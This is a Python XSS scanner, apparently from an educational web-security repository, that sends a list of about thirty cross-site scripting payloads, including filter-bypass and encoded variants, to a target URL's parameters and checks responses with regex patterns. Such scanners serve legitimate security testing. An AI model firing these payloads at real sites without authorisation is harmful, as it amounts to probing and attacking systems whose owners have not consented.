
## xss_detector.py
#!/usr/bin/env python3
"""
XSS Vulnerability Detector
Location: 02-web-application-security/xss-attacks/detection/xss_detector.py

This script detects Cross-Site Scripting (XSS) vulnerabilities by testing
various payloads and analyzing responses.
"""

import requests
import argparse
from urllib.parse import urlparse, parse_qs, quote
import time
import re
from concurrent.futures import ThreadPoolExecutor
import json
from datetime import datetime
import sys
from colorama import init, Fore, Style

init(autoreset=True)

class XSSDetector:
    def __init__(self, target_url, method='GET', threads=5, timeout=10, cookie=None, proxy=None):
        self.target_url = target_url
        self.method = method.upper()
        self.threads = threads
        self.timeout = timeout
        self.cookie = cookie
        self.proxy = proxy
        
        # Setup session
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Security Scanner - Educational Purpose)',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        })
        
        if cookie:
            self.session.headers.update({'Cookie': cookie})
        
        if proxy:
            self.session.proxies.update({'http': proxy, 'https': proxy})
        
        # XSS Payloads
        self.payloads = [
            # Basic payloads
            "<script>alert(1)</script>",
            "<script>alert('XSS')</script>",
            "<script>alert(document.cookie)</script>",
            
            # Image-based
            "<img src=x onerror=alert(1)>",
            "<img src=\"javascript:alert('XSS')\">",
            "<img src=x onmouseover=alert(1)>",
            
            # SVG-based
            "<svg onload=alert(1)>",
            "<svg/onload=alert(1)>",
            
            # Body-based
            "<body onload=alert(1)>",
            "<body onpageshow=alert(1)>",
            
            # Attribute-based
            "\" onmouseover=alert(1) \"",
            "' onmouseover=alert(1) '",
            "javascript:alert(1)",
            
            # Iframe-based
            "<iframe src=\"javascript:alert(1)\">",
            "<iframe onload=alert(1)>",
            
            # Link-based
            "<a href=\"javascript:alert(1)\">click</a>",
            "<a onmouseover=alert(1)>hover</a>",
            
            # Event handlers
            "<div onmouseover=alert(1)>",
            "<input onfocus=alert(1) autofocus>",
            "<details open ontoggle=alert(1)>",
            
            # Encoded payloads
            "%3Cscript%3Ealert(1)%3C/script%3E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            
            # Bypass attempts
            "<scr<script>ipt>alert(1)</scr</script>ipt>",
            "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>",
            
            # DOM-based
            "#<script>alert(1)</script>",
            "javascript:alert(1)//",
            
            # CSS-based
            "<style>@import'javascript:alert(1)';</style>",
            "<div style=\"width: expression(alert(1));\">",
            
            # Data URI
            "<object data=\"data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==\">",
            
            # Meta tag
            "<meta http-equiv=\"refresh\" content=\"0;url=javascript:alert(1)\">",
            
            # Base tag
            "<base href=\"javascript:alert(1);//\">",
        ]
        
        # XSS detection patterns
        self.detection_patterns = [
            r'<script>.*?alert\(.*?\).*?</script>',
            r'onerror=.*?alert\(.*?\)',
            r'onload=.*?alert\(.*?\)',
            r'onmouseover=.*?alert\(.*?\)',
            r'onclick=.*?alert\(.*?\)',
            r'javascript:.*?alert\(.*?\)',
            r'alert\s*\(\s*[\'"].*?[\'"]\s*\)',
            r'prompt\s*\(\s*[\'"].*?[\'"]\s*\)',
            r'confirm\s*\(\s*[\'"].*?[\'"]\s*\)',
        ]
        
        # Results storage
        self.results = {
            'target': target_url,
            'timestamp': datetime.now().isoformat(),
            'vulnerable': False,
            'parameters': [],
            'vulnerabilities': [],
            'summary': {}
        }
    
    def extract_parameters(self):
        """Extract parameters from URL"""
        parsed = urlparse(self.target_url)
        params = parse_qs(parsed.query)
        
        parameter_list = []
        for param_name, param_value in params.items():
            parameter_list.append({
                'name': param_name,
                'value': param_value[0] if param_value else '',
                'type': 'GET'
            })
        
        return parameter_list
    
    def test_parameter(self, base_url, param_name, original_value, param_type='GET'):
        """Test a single parameter for XSS vulnerabilities"""
        vulnerabilities = []
        
        print(f"\n{Fore.CYAN}[*] Testing parameter: {param_name} ({param_type}){Style.RESET_ALL}")
        
        # Get original response
        try:
            original_response = self.make_request(base_url, param_name, original_value, param_type)
            original_text = original_response.text if original_response else ""
        except:
            original_text = ""
        
        for i, payload in enumerate(self.payloads):
            # URL encode the payload
            encoded_payload = quote(payload)
            
            try:
                # Make request with payload
                response = self.make_request(base_url, param_name, encoded_payload, param_type)
                
                if not response:
                    continue
                
                # Check if payload is reflected
                if payload in response.text or encoded_payload in response.text:
                    # Verify if it's actually executed (check for alert pattern)
                    for pattern in self.detection_patterns:
                        if re.search(pattern, response.text, re.IGNORECASE):
                            vulnerability = {
                                'parameter': param_name,
                                'payload': payload,
                                'encoded_payload': encoded_payload,
                                'type': 'Reflected XSS',
                                'context': self.determine_context(response.text, payload),
                                'response_code': response.status_code
                            }
                            vulnerabilities.append(vulnerability)
                            
                            print(f"{Fore.RED}  [!] XSS vulnerability detected!{Style.RESET_ALL}")
                            print(f"      Payload: {payload[:50]}...")
                            print(f"      Context: {vulnerability['context']}")
                            break
                
                # Progress indicator
                if (i + 1) % 10 == 0:
                    print(f"{Fore.CYAN}  [*] Tested {i + 1}/{len(self.payloads)} payloads{Style.RESET_ALL}")
                    
            except Exception as e:
                continue
        
        return vulnerabilities
    
    def determine_context(self, response_text, payload):
        """Determine the context where payload is reflected"""
        contexts = []
        
        # Check if in script tag
        if re.search(f'<script[^>]*>.*?{re.escape(payload)}.*?</script>', response_text, re.DOTALL):
            contexts.append("Inside <script> tag")
        
        # Check if in HTML attribute
        if re.search(f'<[^>]*{re.escape(payload)}[^>]*>', response_text):
            contexts.append("Inside HTML attribute")
        
        # Check if in HTML comment
        if re.search(f'<!--.*?{re.escape(payload)}.*?-->', response_text, re.DOTALL):
            contexts.append("Inside HTML comment")
        
        # Check if in JavaScript string
        if re.search(f'[\'"][^\'"]*{re.escape(payload)}[^\'"]*[\'"]', response_text):
            contexts.append("Inside JavaScript string")
        
        # Check if in CSS
        if re.search(f'<style[^>]*>.*?{re.escape(payload)}.*?</style>', response_text, re.DOTALL):
            contexts.append("Inside CSS")
        
        return contexts[0] if contexts else "Unknown context"
    
    def make_request(self, base_url, param_name, param_value, param_type='GET'):
        """Make HTTP request with parameter"""
        try:
            if param_type == 'GET':
                # Replace parameter value in URL
                if f"{param_name}=" in base_url:
                    import re
                    test_url = re.sub(f"{param_name}=[^&]*", f"{param_name}={param_value}", base_url)
                else:
                    separator = '&' if '?' in base_url else '?'
                    test_url = f"{base_url}{separator}{param_name}={param_value}"
                
                response = self.session.get(test_url, timeout=self.timeout, allow_redirects=True)
                return response
            
        except Exception as e:
            return None
    
    def scan(self):
        """Main scanning function"""
        print(f"""
        {Fore.CYAN}╔═══════════════════════════════════════╗
        ║        XSS Vulnerability Scanner      ║
        ║        FOR EDUCATIONAL USE ONLY        ║
        ╚═══════════════════════════════════════╝{Style.RESET_ALL}
        """)
        
        print(f"{Fore.GREEN}[*] Target: {self.target_url}{Style.RESET_ALL}")
        
        # Check target
        try:
            response = self.session.get(self.target_url, timeout=self.timeout)
            print(f"{Fore.GREEN}[✓] Target is reachable{Style.RESET_ALL}")
        except Exception as e:
            print(f"{Fore.RED}[✗] Target unreachable: {e}{Style.RESET_ALL}")
            return self.results
        
        # Extract and test parameters
        parameters = self.extract_parameters()
        
        if not parameters:
            print(f"{Fore.YELLOW}[!] No parameters found{Style.RESET_ALL}")
            return self.results
        
        print(f"{Fore.GREEN}[*] Found {len(parameters)} parameters{Style.RESET_ALL}")
        
        all_vulnerabilities = []
        for param in parameters:
            vulnerabilities = self.test_parameter(
                self.target_url,
                param['name'],
                param['value'],
                'GET'
            )
            all_vulnerabilities.extend(vulnerabilities)
        
        self.results['vulnerabilities'] = all_vulnerabilities
        self.results['vulnerable'] = len(all_vulnerabilities) > 0
        
        # Generate summary
        self.results['summary'] = {
            'total_parameters': len(parameters),
            'vulnerable_parameters': len(set([v['parameter'] for v in all_vulnerabilities])),
            'total_vulnerabilities': len(all_vulnerabilities)
        }
        
        return self.results
    
    def print_report(self):
        """Print scan report"""
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}XSS SCAN REPORT{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        
        if self.results['vulnerable']:
            print(f"\n{Fore.RED}[!] XSS VULNERABILITIES DETECTED!{Style.RESET_ALL}")
            
            for i, vuln in enumerate(self.results['vulnerabilities'], 1):
                print(f"\n{Fore.YELLOW}Vulnerability #{i}{Style.RESET_ALL}")
                print(f"  Parameter: {vuln['parameter']}")
                print(f"  Payload: {vuln['payload'][:100]}...")
                print(f"  Context: {vuln['context']}")
        else:
            print(f"\n{Fore.GREEN}[✓] No XSS vulnerabilities detected{Style.RESET_ALL}")

def main():
    parser = argparse.ArgumentParser(description='XSS Vulnerability Scanner')
    parser.add_argument('-u', '--url', required=True, help='Target URL')
    parser.add_argument('-o', '--output', help='Output file')
    
    args = parser.parse_args()
    
    print(f"{Fore.YELLOW}[?] Do you have permission to test this target? (yes/no): {Style.RESET_ALL}", end='')
    if input().lower() != 'yes':
        print(f"{Fore.RED}[!] Exiting{Style.RESET_ALL}")
        return
    
    scanner = XSSDetector(args.url)
    results = scanner.scan()
    scanner.print_report()

if __name__ == "__main__":
    main()
